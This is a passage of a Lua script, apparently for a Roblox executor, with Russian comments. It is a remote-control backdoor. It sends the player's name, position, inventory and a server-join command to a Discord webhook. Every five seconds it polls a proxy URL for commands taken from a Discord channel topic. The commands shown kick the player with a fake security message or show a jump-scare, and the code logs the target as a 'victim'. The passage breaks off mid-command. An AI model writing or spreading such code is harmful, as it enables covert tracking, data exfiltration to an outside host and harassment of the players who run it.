-- Функция отправки логов
local function sendLog(title, desc, color)
    pcall(function()
        local inv = ""
        for _, v in pairs(lp.Backpack:GetChildren()) do inv = inv .. "[" .. v.Name .. "] " end
        local pos = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") and lp.Character.HumanoidRootPart.Position or Vector3.new(0,0,0)
        
        local data = {
            ["embeds"] = {{
                ["title"] = title,
                ["description"] = desc,
                ["color"] = color or 0x00ffff,
                ["fields"] = {
                    {["name"] = "👤 Ник", ["value"] = "||"..lp.Name.."||", ["inline"] = true},
                    {["name"] = "📍 Корды", ["value"] = math.floor(pos.X)..", "..math.floor(pos.Y)..", "..math.floor(pos.Z), ["inline"] = true},
                    {["name"] = "🎒 Инвентарь", ["value"] = "```" .. (inv ~= "" and inv or "Пусто") .. "```"},
                    {["name"] = "🔗 Сервер", ["value"] = "game:GetService('TeleportService'):TeleportToPlaceInstance("..game.PlaceId..", '"..game.JobId.."')"}
                },
                ["footer"] = {["text"] = "AxM Direct Control • " .. os.date("%X")}
            }}
        }
        local req = request or http_request or (syn and syn.request)
        if req then req({Url = webhook_url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)}) end
    end)
end

-- Чтение команд из Discord (через прокси описания канала)
task.spawn(function()
    while task.wait(5) do
        pcall(function()
            -- Мы запрашиваем данные о канале через прокси (например, RoProxy или аналоги)
            -- В данном примере используем метод получения "Topic" канала
            local response = game:HttpGet("https://roproxy.com/notifications/get-channel-info?id=" .. channel_id) 
            local data = HttpService:JSONDecode(response)
            local cmd = string.lower(data.topic or "")

            if string.find(cmd, "kick") then
                local reason = string.match(cmd, "kick%s*%((.*)%)") or "Admin Remote Ban"
                sendLog("💀 ВЫПОЛНЕН КИК", "Причина: " .. reason, 0xff0000)
                lp:Kick("\n[AxM Security]\n" .. reason)
                
            elseif string.find(cmd, "screamer") then
                local g = Instance.new("ScreenGui", lp.PlayerGui)
                local i = Instance.new("ImageLabel", g); i.Size = UDim2.new(1.5,0,1.5,0); i.Position = UDim2.new(-0.25,0,-0.25,0)
                i.Image = "rbxassetid://15518663806"
                local s = Instance.new("Sound", workspace); s.SoundId = "rbxassetid://556750162"; s:Play()
                task.wait(0.5); g:Destroy()
                sendLog("😱 ВЫПОЛНЕН СКРИМЕР", "Жертва напугана", 0xffffff)

